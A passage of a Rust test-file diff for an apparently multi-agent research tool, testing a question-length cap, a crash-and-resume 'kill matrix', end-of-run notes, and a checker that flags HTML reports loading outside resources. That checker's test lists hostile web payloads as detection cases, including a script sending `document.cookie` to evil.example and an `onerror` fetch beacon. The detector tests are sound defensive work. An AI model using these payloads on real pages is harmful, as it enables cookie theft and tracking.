+    assert!(refused.starts_with("a driver holds"), "{refused}");
+    assert!(at.elapsed() >= Duration::from_millis(1500), "{:?}", at.elapsed());
+    drop(held);
+}
+
+/// Brief item 8: the route prompt is one argument of the `claude` command line, which Windows cuts near 32,767
+/// characters; a question over 8,000 characters is refused before anything is written.
+#[test]
+fn p47c_a_question_over_8000_characters_is_refused_before_anything_is_written() {
+    let (_home, project) = git_project("p47c-question-cap");
+    let none = |_: &str| None;
+    let before = listing(&project.root);
+    let refused = start(&project, &"x".repeat(8_001), None, &none, false, 1_763_600_000).unwrap_err();
+    assert_eq!(refused.code, 2);
+    assert_eq!(
+        refused.line,
+        "the question is 8001 characters; the limit is 8,000. Put the background in a file in the project and name \
+         the file in the question."
+    );
+    assert_eq!(listing(&project.root), before);
+    assert!(!project.dir().exists());
+    // At the limit, and characters not bytes: 8,000 two-byte characters are taken.
+    assert!(start(&project, &"x".repeat(8_000), None, &none, false, 1_763_600_000).is_ok());
+    assert!(start(&project, &"é".repeat(8_000), None, &none, true, 1_763_600_000).is_ok());
+    nirvana_seat::set_test_world(None);
+}
+
+/// Review F4: the html check, both directions. Every row of the review's table, the brief's additions, and a report
+/// about CSS whose prose says `@import` and `url(https://x)`.
+#[test]
+fn p47c_the_html_check_reads_tags_styles_and_scripts_not_prose() {
+    let page = |body: &str| format!("<!doctype html><html><head><title>r</title></head><body>{body}</body></html>");
+    let bad = [
+        ("<script src=\"app.js\"></script>", "<script> src: app.js"),
+        ("<script src=https://evil.example/x.js></script>", "<script> src: https://evil.example/x.js"),
+        ("<img src=http://evil.example/x.png>", "<img> src: http://evil.example/x.png"),
+        ("<IMG SRC=\"HTTP://EVIL.EXAMPLE/x.png\">", "<img> src: http://evil.example/x.png"),
+        ("<img srcset=\"a.png 1x, https://x.org/b.png 2x\">", "<img> srcset: a.png 1x, https://x.org/b.png 2x"),
+        ("<img alt=\"a>b\" src=\"https://evil.example/x.png\">", "<img> src: https://evil.example/x.png"),
+        ("<img src=\"&#104;ttps://evil.example/x.png\">", "<img> src: https://evil.example/x.png"),
+        ("<img src=\"\\\\evil.example\\share\\x.png\">", "<img> src: \\\\evil.example\\share\\x.png"),
+        ("<img src=\"x.png\" onerror=\"fetch('https://evil.example/log')\">", "<img> onerror fetch(: fetch('https://evil.example/log')"),
+        ("<iframe src=\"https://x.org\"></iframe>", "<iframe> src: https://x.org"),
+        ("<video poster=\"https://evil.example/p.png\"></video>", "<video> poster: https://evil.example/p.png"),
+        ("<style>body{background:url(https://evil.example/x.png)}</style>", "<style> url(: url(https://evil.example/x.png)}"),
+        ("<style>body{background:url( 'http://x.org/a.png')}</style>", "<style> url(: url( 'http://x.org/a.png')}"),
+        ("<style>@import 'x.css';</style>", "<style> @import: @import 'x.css';"),
+        ("<div style=\"background:url( https://evil.example/x )\"></div>", "<div> style url(: url( https://evil.example/x )"),
+        ("<link rel=stylesheet href=https://evil.example/s.css>", "<link rel=stylesheet> href: https://evil.example/s.css"),
+        ("<link rel=stylesheet href=//evil.example/s.css>", "<link rel=stylesheet> href: //evil.example/s.css"),
+        ("<link rel=\"preload\" href=\"https://x.org/f.woff2\" as=\"font\">", "<link rel=preload> href: https://x.org/f.woff2"),
+        ("<link rel=\"icon\" href=\"https://x.org/i.png\">", "<link rel=icon> href: https://x.org/i.png"),
+        ("<link rel=\"modulepreload\" href=\"https://x.org/m.js\">", "<link rel=modulepreload> href: https://x.org/m.js"),
+        ("<svg><image href=\"https://evil.example/x.png\"/></svg>", "<image> href: https://evil.example/x.png"),
+        ("<svg><image xlink:href=\"https://evil.example/x.png\"/></svg>", "<image> xlink:href: https://evil.example/x.png"),
+        ("<svg><use href=\"https://evil.example/x.svg#a\"/></svg>", "<use> href: https://evil.example/x.svg#a"),
+        ("<svg><use xlink:href=\"https://evil.example/x.svg#a\"/></svg>", "<use> xlink:href: https://evil.example/x.svg#a"),
+        ("<base href=\"https://evil.example/\"><img src=\"x.png\">", "<base> href: https://evil.example/"),
+        ("<body background=\"https://evil.example/b.png\">", "<body> background: https://evil.example/b.png"),
+        ("<meta http-equiv=refresh content=\"0;url=https://evil.example\">", "<meta http-equiv=refresh> content: 0;url=https://evil.example"),
+        ("<form action=\"https://evil.example\"></form>", "<form> action: https://evil.example"),
+        ("<script>fetch('https://evil.example/log?'+document.cookie)</script>", "<script> fetch(: fetch('https://evil.example/log?'+document.cookie)"),
+        ("<script>var x = new XMLHttpRequest();</script>", "<script> xmlhttprequest: xmlhttprequest();"),
+        ("<script type=\"module\">import('https://x.org/m.js')</script>", "<script> import(: import('https://x.org/m.js')"),
+        ("<script>const s = new  WebSocket('wss://x.org')</script>", "<script> new websocket: new  websocket('wss://x.org')"),
+    ];
+    for (html, why) in bad {
+        let found = outside_loads(&page(html));
+        assert_eq!(found, [why.to_owned()], "{html}");
+    }
+    // The value is cut at 80 characters.
+    let long = format!("https://evil.example/{}", "a".repeat(200));
+    let found = outside_loads(&page(&format!("<img src=\"{long}\">")));
+    assert_eq!(found, [format!("<img> src: {}", &long[..80])]);
+    let good = [
+        "<p><a href=\"https://example.org/x\">x</a></p>",
+        "<a href=\"https://example.org/x\">a &lt;script src=https://x&gt;</a>",
+        "<img src=\"data:image/png;base64,AAAA\"><img src=\"local.png\">",
+        "<script type=\"application/json\" id=\"claims\">{\"url\":\"https://example.org\",\"fetch(\":\"new WebSocket\"}</script>",
+        "<link rel=\"canonical\" href=\"https://example.org/report\">",
+        "<link rel=alternate href=https://example.org/report.md>",
+        "<p>CSS has @import rules and url(https://x) values</p>",
+        "<pre>@import url(https://x.org/a.css);</pre><code>background: url(https://x.org/a.png)</code>",
+        "<p>call fetch('https://x.org') or new WebSocket(url) or import('m.js')</p>",
+        "<!-- <img src=\"https://evil.example/x.png\"> -->",
+        "<meta http-equiv=\"refresh\" content=\"30\"><meta charset=\"utf-8\">",
+        "<form action=\"#\"></form><svg><use href=\"#icon\"/><image href=\"local.png\"/></svg>",
+        "<style>:root{--bg:#fff} body{background:url(data:image/png;base64,AA)}</style>",
+        "<script>document.querySelector('#claims').textContent.length</script>",
+    ];
+    for html in good {
+        assert_eq!(outside_loads(&page(html)), Vec::<String>::new(), "{html}");
+    }
+    // A report about CSS: its prose and its code say `@import` and `url(https://x)`; it loads nothing.
+    let css_report = page(
+        "<h1>How CSS loads fonts</h1><p>An <code>@import</code> rule pulls a sheet; <code>url(https://x)</code> \
+         names a file.</p><pre><code>@import url(https://fonts.example/css);\nbody { background: url(https://x) }\
+         </code></pre><style>h1{color:#123}</style>",
+    );
+    assert_eq!(outside_loads(&css_report), Vec::<String>::new());
+    let dir = temp("css-report");
+    std::fs::write(dir.join("report.md"), "# How CSS loads fonts\n").unwrap();
+    std::fs::write(dir.join("report.html"), &css_report).unwrap();
+    assert!(check_files(&dir).is_empty(), "{:?}", check_files(&dir));
+    std::fs::write(dir.join("report.html"), page("<img src=\"https://x.org/a.png\">")).unwrap();
+    assert_eq!(
+        check_files(&dir),
+        ["report.html loads <img> src: https://x.org/a.png"]
+    );
+}
+
+/// Fix round item 1: with the researchers' and the writer's lines quiet, the driver's end line and the writer's Method
+/// notes say what did not deliver and why: interrupted and reseated once, a question (its first 200 characters), the
+/// time cap, a send-back; and the writer's reseat.
+#[test]
+fn p47c_the_end_line_and_the_method_notes_say_what_did_not_deliver() {
+    let mut j = J::new("lost");
+    let mut st = state(
+        Stage::Research,
+        &["synthesis", "benchmark", "trajectory", "decision-matrix"],
+    );
+    // r1 passes.
+    j.seat("q-r1", RESEARCH_CLASS);
+    j.pass("q-r1");
+    // r2's worker dies; the driver reseats it once; the reseat's worker dies too.
+    j.seat("q-r2", RESEARCH_CLASS);
+    j.died("q-r2");
+    // r3 is sent back once, then its gate asks a long question.
+    let question = format!("q-r3-s1: {}", "which of the two benchmark suites does the owner trust? ".repeat(6));
+    assert!(question.chars().count() > LOST_WHY_MAX + 50);
+    j.seat("q-r3", RESEARCH_CLASS);
+    j.deliver("q-r3", "x");
+    j.send_back("q-r3", "q-r3-s1");
+    j.deliver("q-r3-s1", "y");
+    j.gate("q-r3-s1", "asked", "sources: two suites disagree");
+    j.add(Kind::Asked {
+        order: Some("q-r3-s1".into()),
+        question: question.clone(),
+    });
+    // r4 is still running at the cap.
+    j.seat("q-r4", RESEARCH_CLASS);
+    assert_eq!(
+        settle(&mut st, &j.state(), NOW),
+        Step::Reseat(1, "q-r2-r1".into())
+    );
+    st.orders[1].reseat = Some("q-r2-r1".into());
+    j.seat("q-r2-r1", RESEARCH_CLASS);
+    j.died("q-r2-r1");
+    assert_eq!(settle(&mut st, &j.state(), NOW), Step::Wait);
+    let cap = st.stage_at + RESEARCH_CAP_S;
+    let Step::Stop(leaves, why) = next(&st, &j.state(), cap, &Caps::default(), false) else {
+        panic!("no stop at the cap")
+    };
+    assert_eq!(leaves, [(Some(3), "q-r4".to_owned())]);
+    st.orders[3].end = Some(ChainEnd {
+        passed: false,
+        leaf: "q-r4".into(),
+        why: Some(why),
+        at: cap,
+    });
+    assert_eq!(settle(&mut st, &j.state(), cap), Step::SeatWriter);
+    // The writer's Method notes.
+    let text = write_text(&st, &j.state());
+    let method: Vec<&str> = text
+        .lines()
+        .skip_while(|line| *line != "## For the Method section")
+        .skip(1)
+        .take_while(|line| !line.starts_with("## "))
+        .filter(|line| !line.is_empty())
+        .collect();
+    let quoted: String = question.chars().take(LOST_WHY_MAX).collect();
+    let r2 = format!(
+        "r2 (benchmark) interrupted twice: {}: pid 4242 is gone (interrupted and reseated once)",
+        nirvana_run::WORKER_DIED
+    );
+    let r3 = format!("r3 (trajectory) asked: \"{quoted}\" (sent back 1 time(s))");
+    let r4 = "r4 (decision-matrix) over the time cap";
+    for line in [&r2, &r3, r4] {
+        assert!(
+            method.contains(&format!("- did not deliver: {line}").as_str()),
+            "{line:?} not in\n{method:#?}"
+        );
+    }
+    // The Method notes quote 200 characters; the "Did not deliver" section above them keeps the whole why.
+    let longer: String = question.chars().take(LOST_WHY_MAX + 1).collect();
+    assert!(!method.join("\n").contains(&longer));
+    assert!(text.contains(&longer));
+    // The writer is interrupted and reseated once, and its reseat passes: a report, whose end line says it all.
+    st.stage = Stage::Write;
+    st.writer = Some(Chain {
+        reseat: Some("q-write-r1".into()),
+        end: passed("q-write-r1"),
+        ..writer_chain(&st)
+    });
+    let path = report_html_rel(&st);
+    j.seat("q-write", WRITE_CLASS);
+    j.died("q-write");
+    j.seat("q-write-r1", WRITE_CLASS);
+    j.deliver("q-write-r1", &format!("{path} The build is slow because of the linker."));
+    j.gate("q-write-r1", "pass", "every axis passed");
+    st.end = Some(ends::REPORT.into());
+    st.end_why = Some(path.clone());
+    let line = tell_line(&st, &j.state());
+    assert!(
+        line.starts_with(&format!(
+            "scholar report: {path} (`herdr scholar status {}`): The build is slow because of the linker.; did not deliver: ",
+            st.run
+        )),
+        "{line}"
+    );
+    for part in [&r2, &r3, r4, "the writer was interrupted and reseated once as q-write-r1"] {
+        assert!(line.contains(part), "{part:?} not in {line}");
+    }
+    // None of it reached the queue.
+    assert!(j.state().queue.is_empty(), "{:?}", j.state().queue);
+    println!("END LINE: {line}\nMETHOD NOTES:\n{}", method.join("\n"));
+}
+
+// ---- the kill matrix (the review's table B, kept as tests: fix round item 9) ----
+
+/// Where a row's first driver is killed: inside the Nth call of a world seam, before or after it acts.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum Kill {
+    Never,
+    Route(u32),
+    SeatBefore(u32),
+    SeatAfter(u32),
+    Sleep(u32),
+    EndBefore(u32),
+    EndAfter(u32),
+    WakeBefore(u32),
+}
+
+/// What the scripted workers and gate do.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum Script {
+    /// r1 passes; r2 is sent back once and its child passes; r3's gate asks.
+    Mixed,
+    /// r2's worker dies with no end record; its reseat passes, as r1 and r3 do.
+    Dies,
+    /// Every researcher's gate asks: no writer.
+    AllFail,
+}
+
+/// A row's facts after the resume.
+#[derive(Debug)]
+struct Row {
+    killed: bool,
+    seated_twice: Vec<String>,
+    ended: bool,
+    end: Option<String>,
+    /// `woken` lines: each time anything was queued for the orchestrator, it was typed or read at a prompt notice.
+    woken: usize,
+    /// The ones of those that came before the run had its outcome.
+    mid_run: usize,
+    /// The driver's own calls of `world.wake`.
+    wake_calls: u32,
+}
+
+fn kill_n_of(slug: &str, id: &str) -> u32 {
+    (1..=5)
+        .find(|n| {
+            let base = research_id(slug, *n);
+            id == base || id.starts_with(&format!("{base}-"))
+        })
+        .unwrap_or(0)
+}
+
+/// One sleep of the driver: the orchestrator reads what is queued, else the workers deliver, else the gate rules.
+fn kill_act(project: &Project, run: &str, st0: &State, script: Script, at: u64, mid_run: &Cell<usize>) {
+    let journal = project.journal(run);
+    let replayed = nirvana_run::replay(&journal.read().0);
+    let slug = &st0.slug;
+    let writer = writer_id(slug);
+    if !replayed.queue.is_empty() {
+        if load_state(project, run).unwrap().end.is_none() {
+            mid_run.set(mid_run.get() + 1);
+        }
+        journal
+            .append(
+                at,
+                Kind::Woken {
+                    via: "prompt".into(),
+                    through: replayed.last_seq,
+                    digest: "d".into(),
+                },
+            )
+            .unwrap();
+        return;
+    }
+    let working: Vec<String> = replayed
+        .orders
+        .iter()
+        .filter(|order| matches!(order.phase, Phase::Seated | Phase::Running))
+        .map(|order| order.id().to_owned())
+        .collect();
+    for id in &working {
+        if script == Script::Dies && *id == research_id(slug, 2) {
+            journal
+                .append(
+                    at,
+                    Kind::Interrupted {
+                        order: id.clone(),
+                        why: format!("{}: pid 4242 is gone", nirvana_run::WORKER_DIED),
+                    },
+                )
+                .unwrap();
+            continue;
+        }
+        let summary = if id.starts_with(&writer) {
+            let dir = project.root.join(&st0.report_dir);
+            std::fs::create_dir_all(&dir).unwrap();
+            std::fs::write(dir.join("report.md"), "# R\n").unwrap();
+            std::fs::write(dir.join("report.html"), "<!doctype html><title>r</title><p>ok</p>").unwrap();
+            format!("{} the answer", report_html_rel(st0))
+        } else {
+            let findings = project.root.join(findings_rel(run, kill_n_of(slug, id)));
+            std::fs::create_dir_all(findings.parent().unwrap()).unwrap();
+            std::fs::write(&findings, format!("- a claim https://example.org/{id}\n")).unwrap();
+            format!("{id} answered")
+        };
+        journal
+            .append(
+                at,
+                Kind::Delivered {
+                    order: id.clone(),
+                    report: serde_json::json!({"status": "done", "summary": summary, "gotchas": ["the other side"],
+                        "sources": [{"url": format!("https://example.org/{id}"), "used_for": "a claim"}]}),
+                },
+            )
+            .unwrap();
+    }
+    if !working.is_empty() {
+        return;
+    }
+    for known in replayed.orders.iter().filter(|order| order.phase == Phase::Delivered) {
+        let id = known.id().to_owned();
+        let n = kill_n_of(slug, &id);
+        let verdict = match script {
+            _ if id.starts_with(&writer) => "pass",
+            Script::AllFail => "asked",
+            Script::Mixed if n == 3 => "asked",
+            Script::Mixed if id == research_id(slug, 2) => "sent_back",
+            _ => "pass",
+        };
+        journal
+            .append(
+                at,
+                Kind::Gated {
+                    order: id.clone(),
+                    verdict: verdict.into(),
+                    reason: Some("scripted".into()),
+                    axes: Vec::new(),
+                },
+            )
+            .unwrap();
+        let follow = match verdict {
+            "sent_back" => Some(Kind::Seated(Box::new(seated(
+                &format!("{id}-s1"),
+                RESEARCH_CLASS,
+                Some("send_back"),
+                Some(&id),
+            )))),
+            "asked" => Some(Kind::Asked {
+                order: Some(id.clone()),
+                question: format!("{id}: the sources disagree; which one does the owner trust?"),
+            }),
+            _ => None,
+        };
+        if let Some(kind) = follow {
+            journal.append(at, kind).unwrap();
+        }
+    }
+}
+
+fn kill_row(script: Script, kill: Kill) -> Row {
+    let (_home, project) = git_project(&format!("p47c-kill-{script:?}-{kill:?}"));
+    let t0 = 1_763_600_000u64;
+    let started = start(
+        &project,
+        "Why is the build slow, how slow, and is it trending up?",
+        Some("wT:p9"),
+        &|_| None,
+        false,
+        t0,
+    )
+    .unwrap();
+    let run = started.state.run.clone();
+    let slug = started.state.slug.clone();
+    // Every id the run can seat is held live, so `seat_order_why` starts no worker.
+    let mut ids: Vec<String> = (1..=3).map(|n| research_id(&slug, n)).collect();
+    ids.push(writer_id(&slug));
+    let held: Vec<_> = ids
+        .iter()
+        .flat_map(|id| [id.clone(), format!("{id}-r1")])
+        .map(|id| crate::nirvana_worker::take_live(&project, &run, &id).unwrap().unwrap())
+        .collect();
+    let kill_now = Cell::new(kill);
+    let (routes, seats, sleeps, ends, wakes) = (Cell::new(0), Cell::new(0), Cell::new(0), Cell::new(0), Cell::new(0));
+    let clock = Cell::new(t0);
+    let mid_run = Cell::new(0usize);
+    let boom = |at: Kill| {
+        if kill_now.get() == at {
+            std::panic::panic_any("the kill matrix's kill");
+        }
+    };
+    let route = |_: &[String], _: &Path| {
+        routes.set(routes.get() + 1);
+        boom(Kill::Route(routes.get()));
+        exited(result_line(serde_json::json!({"orders": [
+            {"style": "hypothesis-elimination", "question": "Why is the build slow?", "why": "why is"},
+            {"style": "benchmark", "question": "How slow is the build?", "why": "how slow"},
+            {"style": "trajectory", "question": "Is build time trending up?", "why": "trend"},
+        ], "note": ""})))
+    };
+    let seat = |project: &Project, seating: &Seating| {
+        seats.set(seats.get() + 1);
+        boom(Kill::SeatBefore(seats.get()));
+        let out = seat_real(project, seating);
+        boom(Kill::SeatAfter(seats.get()));
+        out
+    };
+    let st0 = started.state.clone();
+    let sleep = |_: u64| {
+        clock.set(clock.get() + POLL_S);
+        sleeps.set(sleeps.get() + 1);
+        boom(Kill::Sleep(sleeps.get()));
+        kill_act(&project, &run, &st0, script, clock.get(), &mid_run);
+    };
+    let end_run = |project: &Project, run: &str| {
+        ends.set(ends.get() + 1);
+        boom(Kill::EndBefore(ends.get()));
+        if nirvana_run::replay(&project.journal(run).read().0).ended.is_none() {
+            project
+                .journal(run)
+                .append(clock.get(), ended_kind())
+                .map_err(|err| err.to_string())?;
+        }
+        boom(Kill::EndAfter(ends.get()));
+        Ok(())
+    };
+    let wake = |_: &Project, _: &str| {
+        boom(Kill::WakeBefore(wakes.get() + 1));
+        wakes.set(wakes.get() + 1);
+    };
+    let now = || clock.get();
+    let world = World {
+        now: &now,
+        sleep: &sleep,
+        route: &route,
+        seat: &seat,
+        stop: &|_, _, order| format!("{order}: stopped"),
+        wake: &wake,
+        end_run: &end_run,
+        wakeable: &|_| true,
+    };
+    // A kill is a panic out of the loop: no `Err` arm runs, as no code runs after a real kill.
+    let first = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+        drive(&project, &run, &world, Caps::default())
+    }));
+    let killed = first.is_err();
+    if !killed {
+        first.unwrap().unwrap();
+    }
+    kill_now.set(Kill::Never);
+    if killed {
+        drive(&project, &run, &world, Caps::default()).unwrap();
+    }
+    let events = project.journal(&run).read().0;
+    let mut seated_lines: BTreeMap<String, u32> = BTreeMap::new();
+    let mut woken = 0;
+    for event in &events {
+        match &event.kind {
+            Kind::Seated(seated) => *seated_lines.entry(seated.order.clone()).or_insert(0) += 1,
+            Kind::Woken { .. } => woken += 1,
+            _ => {}
+        }
+    }
+    let row = Row {
+        killed,
+        seated_twice: seated_lines
+            .into_iter()
+            .filter(|(_, n)| *n > 1)
+            .map(|(id, _)| id)
+            .collect(),
+        ended: nirvana_run::replay(&events).ended.is_some(),
+        end: load_state(&project, &run).unwrap().end,
+        woken,
+        mid_run: mid_run.get(),
+        wake_calls: wakes.get(),
+    };
+    drop(held);
+    nirvana_seat::set_test_world(None);
+    row
+}
+
+/// The review's table B: the driver killed at each stage boundary, then resumed. No order is seated twice, the run
+/// ends, and the orchestrator is woken once, at the end, never mid-run (fix round item 1: the lines of what the
+/// driver handles are quiet, and its end line is the one wake).
+#[test]
+fn p47c_the_kill_matrix_resumes_clean_at_every_stop_point() {
+    use Kill::*;
+    let rows: Vec<(Script, Kill, &str)> = [
+        (Script::Mixed, Never, "report"),
+        (Script::Mixed, Route(1), "in the route call"),
+        (Script::Mixed, SeatBefore(1), "routed, nothing seated"),
+        (Script::Mixed, SeatBefore(3), "two of three seated"),
+        (Script::Mixed, SeatAfter(2), "r2 seated, the state not saved"),
+        (Script::Mixed, Sleep(1), "all seated, none delivered"),
+        (Script::Mixed, Sleep(2), "delivered, none gated"),
+        (Script::Mixed, Sleep(3), "r1 passed, r2 sent back, r3 asked"),
+        (Script::Mixed, Sleep(4), "the send-back child delivered, not gated"),
+        (Script::Mixed, Sleep(5), "the writer seated"),
+        (Script::Mixed, Sleep(6), "the writer delivered, not gated"),
+        (Script::Mixed, Sleep(7), "told, the line not read yet"),
+        (Script::Mixed, SeatBefore(4), "after the last gate, the writer not seated"),
+        (Script::Mixed, SeatAfter(4), "the writer seated, the state not saved"),
+        (Script::Mixed, WakeBefore(1), "told, the wake not typed (F5)"),
+        (Script::Mixed, EndBefore(1), "in the run's end, before"),
+        (Script::Mixed, EndAfter(1), "in the run's end, after"),
+        (Script::Dies, Never, "r2 interrupted, reseated once"),
+        (Script::Dies, Sleep(1), "all seated, none acted"),
+        (Script::Dies, Sleep(2), "r2 interrupted and reseated"),
+        (Script::Dies, Sleep(3), "the reseat delivered, none gated"),
+        (Script::Dies, Sleep(5), "the writer delivered, not gated"),
+        (Script::Dies, SeatBefore(4), "the reseat not seated"),
+        (Script::Dies, SeatAfter(4), "the reseat seated, the state not saved"),
+        (Script::Dies, SeatBefore(5), "the writer not seated"),
+        (Script::Dies, SeatAfter(5), "the writer seated, the state not saved"),
+        (Script::AllFail, Never, "every gate asks"),
+        (Script::AllFail, WakeBefore(1), "told, the wake not typed (F5)"),
+    ]
+    .into_iter()
+    .collect();
+    let mut table = Vec::new();
+    for (script, kill, what) in rows {
+        let row = kill_row(script, kill);
+        let label = format!("{script:?} {kill:?} ({what})");
+        assert_eq!(row.killed, kill != Never, "{label}: {row:?}");
+        assert!(row.seated_twice.is_empty(), "{label}: {row:?}");
+        assert!(row.ended, "{label}: {row:?}");
+        let end = if script == Script::AllFail { ends::NO_DELIVERY } else { ends::REPORT };
+        assert_eq!(row.end.as_deref(), Some(end), "{label}: {row:?}");
+        assert_eq!((row.woken, row.mid_run), (1, 0), "{label}: {row:?}");
+        // F5: the driver saves `told` before it wakes, so a kill between the two loses the typing; the line is queued
+        // and the next prompt notice reads it (the one `woken` above). Waking first would type it twice.
+        let calls = if kill == WakeBefore(1) { 0 } else { 1 };
+        assert_eq!(row.wake_calls, calls, "{label}: {row:?}");
+        table.push(format!("{label}: {row:?}"));
+    }
+    println!("{}", table.join("\n"));
 }
